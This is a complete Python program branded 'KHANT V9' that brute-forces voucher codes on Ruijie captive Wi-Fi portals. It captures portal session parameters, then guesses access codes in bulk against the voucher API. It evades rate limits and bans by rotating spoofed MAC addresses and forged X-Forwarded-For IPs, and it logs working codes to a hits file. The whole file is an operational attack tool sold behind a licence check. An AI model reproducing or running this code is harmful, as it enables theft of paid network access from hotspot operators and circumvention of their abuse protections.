import os, time, random, string, json, asyncio, socket, threading, re, sys, uuid
import urllib3, requests, aiohttp
from collections import deque
from urllib.parse import urlparse, parse_qs, quote, unquote, urljoin
from rich.console import Console, Group
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.table import Table
from rich.align import Align

try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 8
TIMEOUT = 8
SESSION_TTL = 25
SESSION_REUSE_MAX = 30
RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_MM_BASE = "https://portal-mm-as.ruijienetworks.com"
RUIJIE_WIFIDOG = "/api/auth/wifidog"
RUIJIE_VOUCHER = "/api/auth/voucher/?lang=en_US"

APP_NAME = "KHANT V9"
APP_TAG  = "@khant7997"

console = Console()
tried_codes = set()
code_lock = threading.Lock()
LICENSE_INFO = {"status": "Unverified"}

_REAL_OUIS = [
    "a4:50:46", "3c:cd:5d", "f4:8e:38", "b0:be:76", "8c:3b:ad",
    "00:1a:11", "d8:bb:c1", "60:38:e0", "e4:95:6e", "94:65:2d",
    "dc:a6:32", "b8:27:eb", "e4:5f:01", "2c:cf:67",
    "40:4e:36", "f0:18:98", "9c:fc:01", "04:0e:3c",
    "ac:bc:32", "7c:d1:c3", "3c:2e:ff",
    "5c:5f:67", "a8:6b:ad", "c0:ee:fb",
    "f0:9f:c2", "38:f9:d3", "6c:19:c0",
    "10:02:b5", "ec:fa:5c", "1c:1b:0d",
    "9a:8b:ec", "5c:5f:67", "a8:6b:ad",
]


def generate_random_mac():
    oui = random.choice(_REAL_OUIS).split(":")
    b = random.randint(0x00, 0x7e)
    return f"{oui[0]}:{oui[1]}:{oui[2]}:{b:02x}:{random.randint(0,0xff):02x}:{random.randint(0,0xff):02x}"


def generate_random_ip():
    if random.random() < 0.7:
        return f"192.168.{random.randint(1,254)}.{random.randint(2,254)}"
    return f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(2,254)}"


def get_real_mac_and_ip():
    ip = "127.0.0.1"
    mac = "00:00:00:00:00:00"
    try:
        mac_raw = uuid.getnode()
        mac = ':'.join(['{:02x}'.format((mac_raw >> elements) & 0xff)
                        for elements in range(0, 2*6, 8)][::-1])
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        pass
    return mac, ip


def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass


def format_time(s):
    try:
        s = int(s)
        return f"{s//3600:02d}:{(s%3600)//60:02d}:{s%60:02d}"
    except Exception:
        return "00:00:00"


def epoch_ms_to_plan(ms, flow_bytes=0):
    try:
        ms = int(ms)
        if ms <= 0:
            return "N/A"
        now = int(time.time() * 1000)
        remain_s = max(0, (ms - now) // 1000)
        flow_gb = 0
        if flow_bytes:
            if isinstance(flow_bytes, str):
                if flow_bytes.endswith("M"):
                    try: flow_gb = round(float(flow_bytes[:-1]) / 1024, 2)
                    except: pass
                elif flow_bytes.endswith("G"):
                    try: flow_gb = float(flow_bytes[:-1])
                    except: pass
                else:
                    try: flow_gb = round(float(flow_bytes) / (1024**3), 2)
                    except: pass
            else:
                try: flow_gb = round(int(flow_bytes) / (1024**3), 2)
                except: pass
        tail = f" | {flow_gb}GB" if flow_gb else ""
        return f"{remain_s//3600}h{(remain_s%3600)//60}m{remain_s%60}s{tail}"
    except Exception:
        return "N/A"


def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        p = ip.split(".")
        p[-1] = "1"
        return ".".join(p)
    except Exception:
        return "192.168.55.1"


def check_license():
    if not HAS_LICENSE_MODULE:
        return False, "license.py မရှိ"
    try:
        r = _license.check_approval()
        if isinstance(r, tuple):
            return r
        return bool(r), "Valid" if r else "Invalid"
    except Exception as e:
        return False, str(e)


def activate_license(k):
    if not HAS_LICENSE_MODULE:
        return False, "license.py မရှိ"
    try:
        return _license.activate(k)
    except Exception as e:
        return False, str(e)


def detect_and_capture():
    """Auto-capture portal URL."""
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S911B) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/120.0.0.0 Mobile Safari/537.36"
    })
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://detectportal.firefox.com/success.txt",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for probe in probes:
        try:
            r = s.get(probe, allow_redirects=True, timeout=5, verify=False)
            if "ruijienetworks" in r.url:
                console.print("[green][+] Auto-captured portal[/green]")
                return r.url
        except Exception:
            continue

    gateways = [get_gateway_ip(), "192.168.55.1", "192.168.7.1", "192.168.1.1"]
    for gw in dict.fromkeys(gateways):
        try:
            r = s.get(f"http://{gw}", timeout=3, allow_redirects=True, verify=False)
            if "ruijienetworks" in r.url:
                console.print(f"[green][+] Auto-captured via gateway {gw}[/green]")
                return r.url
        except Exception:
            pass

    console.print("[yellow][!] Auto-capture failed.[/yellow]")
    return None


def build_gw_params(portal_url):
    p = {
        "stage": "portal",
        "gw_id": "9cce882728a9",
        "gw_sn": "H1U61BK002346",
        "gw_address": "192.168.55.1",
        "gw_port": "2060",
        "nasip": "192.168.1.153",
        "ssid": "VLAN55",
        "slot_num": "15",
        "ustate": "0",
        "mac_req": "1",
        "chap_id": r"\211",
        "chap_challenge": r"\325\113\207\153\375\350\376\244\033\375\062\010\200\127\210\241",
        "url": "http://connectivitycheck.gstatic.com/generate_204",
        "v": "2",
    }
    if not portal_url:
        return p

    q = parse_qs(urlparse(portal_url).query)
    keys = (
        "gw_id", "gw_sn", "gw_address", "gw_port", "nasip", "slot_num",
        "ssid", "chap_id", "chap_challenge", "stage", "ustate",
        "mac_req", "url", "gw_mac", "mac", "ip",
        "timestamp", "sign", "v",
    )
    for k in keys:
        if q.get(k):
            p[k] = unquote(q[k][0])

    if p.get("gw_address") and p["gw_address"] not in ("192.168.7.1", ""):
        parts = p["gw_address"].split(".")
        if len(parts) == 4 and p.get("nasip") is None:
            p["nasip"] = ".".join(parts[:3] + ["1"])

    base = RUIJIE_MM_BASE if "portal-mm" in portal_url else RUIJIE_BASE
    p["url"] = base
    return p


SESSION_PATTERNS = [
    r'["\']?sessionId["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-=+/]{16,})["\']',
    r'["\']?sessionId["\']?\s*[:=]\s*([A-Za-z0-9_\-=+/]{16,})',
    r'["\']?session_id["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-=+/]{16,})',
    r'/auth/wifidog\?[^"\'\s<>]*sessionId=([A-Za-z0-9_\-=+/]{16,})',
    r'[?&]sessionId=([A-Za-z0-9_\-=+/]{16,})',
    r'window\.location(?:\.href)?\s*=\s*["\'][^"\']*sessionId=([A-Za-z0-9_\-=+/]{16,})',
    r'sessionId=([A-Za-z0-9_\-=+/]{16,})',
]

SIGN_PATTERNS = [
    r'["\']?sign["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-=+/]+)',
    r'[?&]sign=([A-Za-z0-9_\-=+/]+)',
]
TS_PATTERNS = [
    r'["\']?timestamp["\']?\s*[:=]\s*["\']?(\d{10,13})',
    r'[?&]timestamp=(\d{10,13})',
]


def _find_first(patterns, text):
    if not text:
        return None
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return m.group(1).rstrip('"\';, ')
    return None


def _extract_from_url(u):
    if not u:
        return None, None, None
    u = unquote(u)
    q = parse_qs(urlparse(u).query)
    return q.get("sessionId", [None])[0], q.get("sign", [None])[0], q.get("timestamp", [None])[0]


def _extract_session(body, final_url, history):
    sid, sign, ts = _extract_from_url(final_url)

    if not sid and history:
        for h in reversed(history):
            loc = h if isinstance(h, str) else (h.headers.get("Location", "") or "")
            s, sg, t = _extract_from_url(loc)
            if s:
                sid, sign, ts = s, sg or sign, t or ts
                break

    if not sid:
        sid = _find_first(SESSION_PATTERNS, body)
    if not sign:
        sign = _find_first(SIGN_PATTERNS, body)
    if not ts:
        ts = _find_first(TS_PATTERNS, body)

    if not sid and body:
        m = re.search(r'URL\s*=\s*["\']?([^"\'\s>]*sessionId=[^"\'\s>]+)', body, re.I)
        if m:
            s, sg, t = _extract_from_url(m.group(1))
            sid, sign, ts = s or sid, sg or sign, t or ts

    return sid, sign, ts


def _sess_dict(sid, sign, ts, final_u, base, mac, ip):
    return {
        "sessionId": sid,
        "sign": sign,
        "timestamp": ts,
        "logonUrl": final_u,
        "url_base": base,
        "mac": mac,
        "ip": ip,
        "acquired": time.time(),
    }


async def fetch_real_session(session, gw_params, mac, ip, retries=3):
    errors = []
    primary = (gw_params.get("url") or RUIJIE_BASE).rstrip("/")
    base = RUIJIE_MM_BASE if "portal-mm" in primary else RUIJIE_BASE

    use_mac = (mac or generate_random_mac()).lower()
    use_ip = ip or generate_random_ip()

    headers = {
        "User-Agent": ("Mozilla/5.0 (Linux; Android 14; SM-S911B) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/120.0.0.0 Mobile Safari/537.36"),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Client-Mac": use_mac,
        "X-Forwarded-For": use_ip,
        "Referer": base + "/",
        "Connection": "close",
    }

    for attempt in range(retries):
        base_full = base + RUIJIE_WIFIDOG
        p = dict(gw_params)
        p["mac"] = use_mac
        p["ip"] = use_ip
        p["url"] = base
        if "v" not in p:
            p["v"] = "2"

        qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in p.items())
        url = f"{base_full}?{qs}"

        try:
            session.cookie_jar.clear()
        except Exception:
            pass

        try:
            async with session.get(url, headers=headers, timeout=TIMEOUT + 2,
                                   allow_redirects=False, ssl=False) as r1:
                loc = r1.headers.get("Location", "") or ""
                loc_low = loc.lower()

                if r1.status == 429 or any(x in loc_low for x in (
                    "request limited", "too many", "banned", "ip limit", "rate limit"
                )):
                    use_mac = generate_random_mac().lower()
                    use_ip = generate_random_ip()
                    headers["Client-Mac"] = use_mac
                    headers["X-Forwarded-For"] = use_ip
                    await asyncio.sleep(random.uniform(0.4, 1.0))
                    continue

                sid, sign, ts = _extract_from_url(loc)
                if not sid:
                    sid = _find_first(SESSION_PATTERNS, loc)
                    sign = sign or _find_first(SIGN_PATTERNS, loc)
                    ts = ts or _find_first(TS_PATTERNS, loc)

                if sid and len(sid) >= 16:
                    final_u = urljoin(base_full, loc) if loc else base_full
                    return ("REAL", _sess_dict(sid, sign, ts, final_u,
                                               base, use_mac, use_ip))

            async with session.get(url, headers=headers, timeout=TIMEOUT + 2,
                                   allow_redirects=True, ssl=False) as r2:
                if r2.status == 429:
                    use_mac = generate_random_mac().lower()
                    use_ip = generate_random_ip()
                    headers["Client-Mac"] = use_mac
                    headers["X-Forwarded-For"] = use_ip
                    await asyncio.sleep(random.uniform(0.4, 1.0))
                    continue

                body = await r2.text(errors="ignore")
                low = (body or "").lower()
                if any(x in low for x in ("request limited", "too many",
                                          "banned", "ip limit", "rate limit")):
                    use_mac = generate_random_mac().lower()
                    use_ip = generate_random_ip()
                    headers["Client-Mac"] = use_mac
                    headers["X-Forwarded-For"] = use_ip
                    await asyncio.sleep(random.uniform(0.4, 1.0))
                    continue

                hist = [str(hh.url) for hh in r2.history] + \
                       [hh.headers.get("Location", "") for hh in r2.history]
                sid, sign, ts = _extract_session(body, str(r2.url), hist)
                if sid and len(sid) >= 16:
                    return ("REAL", _sess_dict(sid, sign, ts, str(r2.url),
                                               base, use_mac, use_ip))

                errors.append(f"nosid@HTTP{r2.status}")
                use_mac = generate_random_mac().lower()
                use_ip = generate_random_ip()
                headers["Client-Mac"] = use_mac
                headers["X-Forwarded-For"] = use_ip

        except asyncio.TimeoutError:
            errors.append("timeout")
            use_mac = generate_random_mac().lower()
            use_ip = generate_random_ip()
            headers["Client-Mac"] = use_mac
            headers["X-Forwarded-For"] = use_ip
        except Exception as e:
            errors.append(f"err:{type(e).__name__}")

        if attempt < retries - 1:
            await asyncio.sleep(0.25)

    return ("FAIL", "|".join(errors[-2:]) or "no-session")
async def test_code(session, sess, code, mac, ip):
    sid = sess.get("sessionId")
    if not sid:
        return "__SESSION_EXPIRED__", "N/A"

    base_url = sess.get("url_base", RUIJIE_BASE).rstrip("/")
    use_mac = sess.get("mac", mac).lower()
    use_ip = sess.get("ip", ip)

    url = base_url + RUIJIE_VOUCHER
    if sess.get("sign") and sess.get("timestamp"):
        url += f"&sign={sess['sign']}&timestamp={sess['timestamp']}"

    ref_page = (f"{base_url}/download/static/maccauth/src/index_mm.html?sessionId={sid}"
                if "portal-mm" in base_url
                else f"{base_url}/download/static/maccauth/src/index.html?sessionId={sid}")

    headers = {
        "content-type": "application/json;charset=UTF-8",
        "user-agent": ("Mozilla/5.0 (Linux; Android 12; SM-A125F) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/120.0.0.0 Mobile Safari/537.36"),
        "referer": ref_page,
        "Client-Mac": use_mac,
        "X-Forwarded-For": use_ip,
        "Accept": "application/json, text/plain, */*",
        "Origin": base_url,
        "Connection": "keep-alive",
    }
    payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}

    try:
        async with session.post(url, json=payload, headers=headers,
                                timeout=TIMEOUT, allow_redirects=False,
                                ssl=False) as r:
            if r.status == 429:
                return "__RATE_LIMITED__", "N/A"

            text = await r.text()
            if not text:
                return "__NETWORK_ERROR__", "N/A"

            low = text.lower()
            if "request limited" in low or "too many" in low or "rate limit" in low:
                return "__RATE_LIMITED__", "N/A"

            if any(x in low for x in ("session timed out", "invalid session",
                                      "session expired", "session not found",
                                      "please refresh", "session invalid",
                                      "session does not exist", "session timeout")):
                return "__SESSION_EXPIRED__", "N/A"

            real_plan = "N/A"
            is_hit = False
            try:
                j = json.loads(text)
                if j.get("success") is True or j.get("code") == 200:
                    is_hit = True
                    rd = j.get("result", {})
                    if isinstance(rd, dict):
                        exp = rd.get("expireTime") or rd.get("expire_time")
                        flow = rd.get("flow") or rd.get("bytes") or 0
                        if exp:
                            real_plan = epoch_ms_to_plan(exp, flow)
                        elif rd.get("duration"):
                            real_plan = f"{rd['duration']}s"
            except Exception:
                if '"success":true' in low or "congratulations" in low:
                    is_hit = True
            return ("HIT" if is_hit else text[:60]), real_plan

    except asyncio.TimeoutError:
        return "__TIMEOUT__", "N/A"
    except Exception as e:
        return f"__ERROR__:{type(e).__name__}", "N/A"


_CHARSETS = {"num": string.digits,
             "eng": string.ascii_lowercase,
             "mix": string.ascii_lowercase + string.digits}
seq_counter = 1
seq_lock = threading.Lock()


def gen_code(mode, length, scan_method="random"):
    chars = _CHARSETS.get(mode)
    if not chars:
        return ""
    space = len(chars) ** length
    global seq_counter

    if scan_method == "sequential":
        with seq_lock:
            n = seq_counter
            seq_counter += 1
        if n >= space:
            return None
        base = len(chars)
        out = []
        for _ in range(length):
            out.append(chars[n % base])
            n //= base
        return "".join(reversed(out))

    if len(tried_codes) >= space:
        return None
    with code_lock:
        use_set = space <= 500_000
        for _ in range(60):
            c = "".join(random.choices(chars, k=length))
            if not use_set or c not in tried_codes:
                if use_set:
                    tried_codes.add(c)
                return c
        return None


def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
                speed, mac, ip, sess_stat, sess_id, total):
    try:
        progress = min(100.0, (tested / total) * 100) if total else 0.0

        header = Panel(Align.center(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_cyan")),
                       border_style="cyan", box=ROUNDED, height=3)

        stat_style = "bold red" if any(x in str(status).upper() for x in (
            "ERR", "TIMEOUT", "BAN", "EXHAUST", "FAIL", "CHECK", "NO")) else "bold green"
        sess_style = {"REAL": "bold green", "EXPIRED": "bold red", "BANNED": "bold red",
                      "HIT": "bold bright_green", "FAIL": "bold yellow",
                      "FETCH": "bold cyan"}.get(sess_stat, "bold cyan")
        sess_txt = (f"{sess_stat} ({(sess_id or '')[:8]})"
                    if sess_id and sess_id != "--------" else sess_stat)

        tbl = Table.grid(expand=True, padding=(0, 1))
        for _ in range(4):
            tbl.add_column(style="bold white", justify="left")
        tbl.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
        tbl.add_row("  🎯 Mode", f": {mode_str}", "  📊 Tested", f": {tested:,}")
        tbl.add_row("  ⚡ Speed", f": {int(speed)} c/m", "  📡 Status", f": {status}", style=stat_style)
        tbl.add_row("  🔑 Hits", f": {len(hits)}", "  📌 Engine", f": {scan_method.upper()}")
        tbl.add_row("  🖥 MAC", f": ...{mac[-8:]}", "  🌐 IP", f": ...{ip[-8:]}")
        tbl.add_row("  🔐 Session", f": {sess_txt}", "  📈 Progress", f": {progress:.2f}%", style=sess_style)

        tbl_panel = Panel(tbl, border_style="magenta", box=ROUNDED, height=7)
        code_panel = Panel(Align.center(Text(f"Check Code : {cur_code or '------'}",
                                             style="bold yellow")),
                           border_style="yellow", box=ROUNDED, height=3)

        vt = Table(show_header=True, header_style="bold bright_white", expand=True,
                   box=ROUNDED, border_style="green")
        vt.add_column("Voucher", style="bold green", justify="center")
        vt.add_column("Real Plan", style="bold green", justify="center")
        vt.add_column("Time", style="bold cyan", justify="center")
        for h in list(hits)[-5:]:
            vt.add_row(str(h.get('code', '')), str(h.get('plan', 'N/A')),
                       str(h.get('time', '')))
        if not hits:
            vt.add_row("—", "—", "—")

        footer = Panel(Align.center(Text(f"✨ Thank You {APP_TAG} ✨", style="bold bright_yellow")),
                       border_style="red", box=ROUNDED, height=3)
        return Group(header, tbl_panel, code_panel, vt, footer)
    except Exception:
        return Text("⏳ Loading...", style="bold cyan")


async def scan_loop_async(mode, length, scan_method, gw_params):
    global seq_counter
    tried_codes.clear()
    seq_counter = 1

    total_target = {"num": 10 ** length, "eng": 26 ** length,
                    "mix": 36 ** length}.get(mode, 1_000_000)
    mode_str = f"{mode.upper()}-{length}"

    hits = deque(maxlen=500)
    start = time.time()

    state = {"cur_code": "", "tested": 0, "status": "Init",
             "sess_stat": "NONE", "sess_id": "--------"}
    state_lock = threading.Lock()

    mac = generate_random_mac()
    ip = generate_random_ip()

    main_sess = None
    main_sess_time = 0.0
    main_sess_used = 0
    spare_task = None
    sess_lock = asyncio.Lock()

    fail_count = 0
    ban_cooldown = 2.0

    sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
    conn = aiohttp.TCPConnector(limit=200, limit_per_host=0, ssl=False,
                                force_close=False, enable_cleanup_closed=True)

    def _snap():
        with state_lock:
            return dict(state)

    def set_state(**kw):
        with state_lock:
            state.update(kw)

    async def _fetch_one():
        nonlocal mac, ip
        try:
            return await fetch_real_session(session, gw_params, mac, ip, retries=3)
        except Exception as e:
            return ("FAIL", f"exc:{type(e).__name__}")

    async def session_health():
        nonlocal main_sess, main_sess_time, main_sess_used, spare_task
        nonlocal fail_count, ban_cooldown, mac, ip

        if main_sess is not None:
            if (time.time() - main_sess_time) < SESSION_TTL and main_sess_used < SESSION_REUSE_MAX:
                return True

        async with sess_lock:
            if spare_task is not None:
                if not spare_task.done():
                    try:
                        tag, payload = await asyncio.wait_for(spare_task, timeout=6)
                    except Exception:
                        tag, payload = ("FAIL", "spare-timeout")
                else:
                    try:
                        tag, payload = spare_task.result()
                    except Exception:
                        tag, payload = ("FAIL", "spare-error")
                spare_task = None
            else:
                set_state(status="Fetching session…", sess_stat="FETCH")
                tag, payload = await _fetch_one()

            if tag == "REAL":
                main_sess = payload
                main_sess_time = time.time()
                main_sess_used = 0
                mac = payload.get("mac", mac)
                ip = payload.get("ip", ip)
                set_state(sess_stat="REAL", sess_id=payload["sessionId"], status="Active")
                fail_count = 0
                ban_cooldown = 2.0
                spare_task = asyncio.create_task(_fetch_one())
                return True

            if tag == "BAN":
                set_state(sess_stat="BANNED", status="Banned → rotate")
                mac = generate_random_mac()
                ip = generate_random_ip()
                await asyncio.sleep(ban_cooldown)
                ban_cooldown = min(ban_cooldown * 1.4, 12)
                spare_task = asyncio.create_task(_fetch_one())
                return False

            set_state(sess_stat="FAIL", status=f"Fail: {str(payload)[:30]}")
            fail_count += 1
            mac = generate_random_mac()
            ip = generate_random_ip()
            await asyncio.sleep(0.3 if fail_count < 2 else 0.7)
            if fail_count >= 2:
                fail_count = 0
            spare_task = asyncio.create_task(_fetch_one())
            return False

    async def timer_task():
        while True:
            try:
                s = _snap()
                elapsed = time.time() - start
                speed = (s["tested"] / max(1, elapsed)) * 60
                if live is not None:
                    live.update(render_dash(
                        mode_str, scan_method, s["cur_code"], s["tested"],
                        format_time(elapsed), s["status"], hits, speed,
                        mac, ip, s["sess_stat"], s["sess_id"], total_target
                    ), refresh=True)
            except Exception:
                pass
            await asyncio.sleep(0.5)

    live = None
    async with aiohttp.ClientSession(connector=conn) as session:
        initial = render_dash(mode_str, scan_method, "", 0, "00:00:00", "Init",
                              hits, 0.0, mac, ip, "NONE", "--------", total_target)
        live = Live(initial, refresh_per_second=8, console=console, transient=False)
        live.start(refresh=True)
        timer = asyncio.create_task(timer_task())

        spare_task = asyncio.create_task(_fetch_one())

        try:
            while True:
                if main_sess is None:
                    ok = await session_health()
                    if not ok:
                        continue

                age = time.time() - main_sess_time
                if (age >= SESSION_TTL or main_sess_used >= SESSION_REUSE_MAX) \
                        and spare_task is None:
                    spare_task = asyncio.create_task(_fetch_one())

                batch = []
                exhausted = False
                while len(batch) < CONCURRENCY_LIMIT:
                    c = gen_code(mode, length, scan_method)
                    if c is None:
                        exhausted = True
                        break
                    if c and c not in batch:
                        batch.append(c)
                if exhausted and not batch:
                    set_state(status="EXHAUSTED")
                    break
                if not batch:
                    await asyncio.sleep(0.02)
                    continue

                async def _run(code):
                    async with sem:
                        return await test_code(session, main_sess, code, mac, ip)

                try:
                    results = await asyncio.gather(*[_run(c) for c in batch],
                                                   return_exceptions=True)
                except Exception:
                    results = []

                refresh_needed = False
                for idx, r in enumerate(results):
                    if isinstance(r, Exception):
                        with state_lock:
                            state["tested"] += 1
                        continue
                    if not (isinstance(r, tuple) and len(r) == 2):
                        with state_lock:
                            state["tested"] += 1
                        continue

                    res, plan = r
                    with state_lock:
                        state["tested"] += 1
                        state["cur_code"] = batch[idx] if idx < len(batch) else ""
                    main_sess_used += 1

                    if res == "__SESSION_EXPIRED__":
                        refresh_needed = True
                        set_state(sess_stat="EXPIRED", status="Session expired → rotate")
                        break
                    if res == "__RATE_LIMITED__":
                        refresh_needed = True
                        set_state(sess_stat="BANNED", status="429 → rotate")
                        mac = generate_random_mac()
                        ip = generate_random_ip()
                        await asyncio.sleep(ban_cooldown)
                        ban_cooldown = min(ban_cooldown * 1.4, 12)
                        break
                    if isinstance(res, str) and res.startswith("__"):
                        continue

                    if res == "HIT":
                        ts = time.strftime("%H:%M:%S")
                        hits.append({"code": batch[idx], "plan": plan, "time": ts})
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{ts}] {batch[idx]} | {plan}\n")
                        except Exception:
                            pass
                        set_state(sess_stat="HIT")

                age = time.time() - main_sess_time
                if (main_sess_used >= SESSION_REUSE_MAX or age >= SESSION_TTL) and not refresh_needed:
                    refresh_needed = True
                    set_state(sess_stat="REAL", status="TTL/Reuse rotate")

                if refresh_needed:
                    async with sess_lock:
                        if spare_task is not None and spare_task.done():
                            try:
                                tag, payload = spare_task.result()
                            except Exception:
                                tag, payload = ("FAIL", "spare-err")
                            spare_task = None
                            if tag == "REAL":
                                main_sess = payload
                                main_sess_time = time.time()
                                main_sess_used = 0
                                mac = payload.get("mac", mac)
                                ip = payload.get("ip", ip)
                                set_state(sess_stat="REAL",
                                          sess_id=payload["sessionId"],
                                          status="Active")
                                spare_task = asyncio.create_task(_fetch_one())
                                continue
                        main_sess = None
                        main_sess_time = 0.0
                        main_sess_used = 0
                        if spare_task is None:
                            spare_task = asyncio.create_task(_fetch_one())

                await asyncio.sleep(0.005)

        except (KeyboardInterrupt, asyncio.CancelledError):
            set_state(status="Stopped")
        finally:
            timer.cancel()
            try:
                await timer
            except (asyncio.CancelledError, Exception):
                pass
            if spare_task is not None and not spare_task.done():
                spare_task.cancel()
                try:
                    await spare_task
                except (asyncio.CancelledError, Exception):
                    pass
            try:
                live.stop()
            except Exception:
                pass

        s = _snap()
        try:
            console.print(Panel(
                Align.center(Text(
                    f"✅ Done • Tested {s['tested']:,} • Hits {len(hits)}",
                    style="bold bright_green")),
                border_style="green", box=ROUNDED))
        except Exception:
            pass


def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════",
                       style="bold bright_cyan"), justify="center")
    console.print(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════",
                       style="bold bright_cyan"), justify="center")
    console.print()


def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number   (0-9)")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet (a-z)")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed    (a-z0-9)")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        try:
            c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        except (KeyboardInterrupt, EOFError):
            return None
        if c == "0":
            return None
        if c in ("1", "2", "3"):
            return {"1": "num", "2": "eng", "3": "mix"}[c]


def ask_length(mode):
    lengths = (6, 7, 8, 9)
    while True:
        show_banner()
        console.print(f"  [bold bright_white]Mode {mode.upper()} — Length[/bold bright_white]\n")
        for i, L in enumerate(lengths, 1):
            console.print(f"  [bold bright_cyan]{i}.[/bold bright_cyan] {L} chars")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        try:
            c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        except (KeyboardInterrupt, EOFError):
            return None
        if c == "0":
            return None
        if c in [str(i) for i in range(1, len(lengths) + 1)]:
            return lengths[int(c) - 1]


def ask_scan():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential\n")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        try:
            c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        except (KeyboardInterrupt, EOFError):
            return None
        if c == "0":
            return None
        if c in ("1", "2"):
            return {"1": "random", "2": "sequential"}[c]


def run():
    global LICENSE_INFO
    show_banner()

    ok, msg = check_license()
    while not ok:
        clear_screen()
        try:
            console.print(Panel(Align.center(Text("🔐 Enter License Key (or 'q' to quit)",
                                                   style="bold yellow")),
                                border_style="yellow"))
            k = Prompt.ask("  ➜ Key").strip()
        except (KeyboardInterrupt, EOFError):
            console.print("[bold red]Cancelled.[/bold red]")
            sys.exit(0)
        if k.lower() in ("q", "quit", "exit"):
            console.print("[bold red]Cancelled.[/bold red]")
            sys.exit(0)
        if not k:
            continue
        ok2, m2 = activate_license(k)
        try:
            console.print(Panel(Align.center(Text(m2,
                                                  style="bold green" if ok2 else "bold red")),
                                border_style="green" if ok2 else "red"))
        except Exception:
            pass
        time.sleep(2)
        ok, msg = check_license()
    LICENSE_INFO["status"] = msg

    portal_url = detect_and_capture()
    gw_params = build_gw_params(portal_url)

    console.print(f"[dim]  • base      : {gw_params.get('url')}[/dim]")
    console.print(f"[dim]  • mac       : random (auto-rotate)[/dim]")
    console.print(f"[dim]  • ip        : random (auto-rotate)[/dim]")
    console.print(f"[dim]  • sign      : {'✓' if gw_params.get('sign') else '✗'}[/dim]")
    console.print(f"[dim]  • timestamp : {gw_params.get('timestamp', '✗')}[/dim]")
    console.print(f"[dim]  • v         : {gw_params.get('v', '2')}[/dim]")
    time.sleep(1.5)

    while True:
        mode = ask_mode()
        if mode is None:
            break
        length = ask_length(mode)
        if length is None:
            continue
        scan_m = ask_scan()
        if scan_m is None:
            continue

        try:
            asyncio.run(scan_loop_async(mode, length, scan_m, gw_params))
        except KeyboardInterrupt:
            pass
        except Exception as e:
            console.print(f"[bold red]Error: {e}[/bold red]")
            time.sleep(2)


def main():
    try:
        run()
    except (KeyboardInterrupt, EOFError):
        console.print("\n[bold red]Exiting...[/bold red]")
    except Exception as e:
        try:
            console.print(f"[bold red]Fatal: {e}[/bold red]")
        except Exception:
            pass
    finally:
        try:
            console.print()
            console.print(Text(f"✨ {APP_TAG} ✨", style="bold bright_green"),
                           justify="center")
        except Exception:
            pass
        time.sleep(1)


if __name__ == "__main__":
    main()
